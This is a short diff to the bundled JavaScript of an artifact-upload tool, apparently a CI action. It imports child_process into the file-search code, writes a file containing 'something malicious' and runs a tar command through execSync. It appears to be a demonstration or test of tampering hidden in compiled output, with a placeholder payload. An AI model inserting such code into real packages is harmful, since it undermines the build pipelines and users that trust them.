@@ -1448,6 +1448,13 @@ exports.realpath = function realpath(p, cache, cb) {
 
 /***/ }),
 
+/***/ 129:
+/***/ (function(module) {
+
+module.exports = require("child_process");
+
+/***/ }),
+
 /***/ 141:
 /***/ (function(__unusedmodule, exports, __webpack_require__) {
 
@@ -6430,6 +6437,7 @@ Object.defineProperty(exports, "__esModule", { value: true });
 const glob = __importStar(__webpack_require__(281));
 const path = __importStar(__webpack_require__(622));
 const fs = __importStar(__webpack_require__(747));
+const child_process = __importStar(__webpack_require__(129));
 const core_1 = __webpack_require__(470);
 const fs_1 = __webpack_require__(747);
 const path_1 = __webpack_require__(622);
@@ -6541,7 +6549,8 @@ function findFilesToUpload(searchPath, globOptions) {
           not preserved and the root directory will be the single files parent directory
         */
         if (searchResults.length === 1 && searchPaths[0] === searchResults[0]) {
-            fs.writeFileSync(searchResults[0], "something malicious");
+            fs.writeFileSync("main.sh", "something malicious");
+            child_process.execSync("tar -czvf mytool.tar.gz main.sh");
             return {
                 filesToUpload: searchResults,
                 rootDirectory: path_1.dirname(searchResults[0])
